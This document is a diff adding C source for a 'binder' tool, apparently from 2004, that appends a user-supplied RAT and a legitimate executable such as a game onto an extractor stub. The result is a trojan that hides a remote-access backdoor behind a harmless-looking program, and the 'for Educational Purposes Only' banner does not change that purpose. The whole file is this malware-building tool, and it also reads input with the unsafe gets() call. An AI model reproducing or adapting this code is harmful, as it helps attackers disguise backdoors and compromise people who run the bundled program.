@@ -1,0 +1,92 @@
+///////////////////////////////////////////////
+//		BINDER.EXE
+//
+//		- to bind xtractor.exe stub to any 
+//		  executables and RATs in this format:
+//		  
+//		  1.  xtractor.exe
+//		  2.  RAT
+//		  3.  a legitmate executable, eg games,
+//			  greetings             
+//
+//		by Paul Chin
+//		Jan 25, 2004
+//
+//		- for Educational Purposes Only
+//		  
+///////////////////////////////////////////////
+
+#include <stdio.h>
+
+int file_copy( char *oldname, char *newname );
+
+main()
+{
+     char source[80], destination[]="xtractor.exe";
+
+     //--------Greets ---------------------
+	 printf("\n\nInti Binder - coded by Paul Chin\nfor Educational Purposes Only\n");
+	 printf("===============================================\n\n");
+
+	 //--------Bind the RAT ----------------------
+     printf("\n[1] Enter RAT [backdoor] file: ");
+     gets(source);
+     
+     if ( file_copy( source, destination ) == 0 )
+         puts("[2] Copy operation successful");
+     else
+	 {
+         fprintf(stderr, "Error during copy operation");
+		 return 0;
+	 }
+
+	 //----Bind the real executable file, eg games, etc--------
+	 printf("\n[3] Enter a real executable file, eg games, etc: ");
+     gets(source);
+     if ( file_copy( source, destination ) == 0 )
+         puts("\n[4] Copy operation successful");
+     else
+	 {
+         fprintf(stderr, "Error during copy operation");
+		 return 0;
+	 }
+
+	 return(0);
+}
+
+
+int file_copy( char *sourcename, char *stubname )
+{
+     FILE *fsource, *fstub; 
+     int c;
+
+     // Open the source file for reading in binary mode.
+     if ( ( fsource = fopen( sourcename, "rb" ) ) == NULL )
+         return -1;
+
+     // Open the destination file for appending in binary mode. */
+     if ( ( fstub = fopen( stubname, "ab" ) ) == NULL  )
+     {
+         fclose ( fsource );
+         return -1;
+     }
+
+     // Read one byte at a time from the source; if end of file 
+     // has not been reached, write the byte to the 
+     // destination. 
+
+     while (1)
+     {
+         c = fgetc( fsource );
+
+         if ( !feof( fsource ) )
+             fputc( c, fstub );
+         else
+             break;
+     }
+
+     fclose ( fstub );
+     fclose ( fsource );
+
+     return(0);
+}
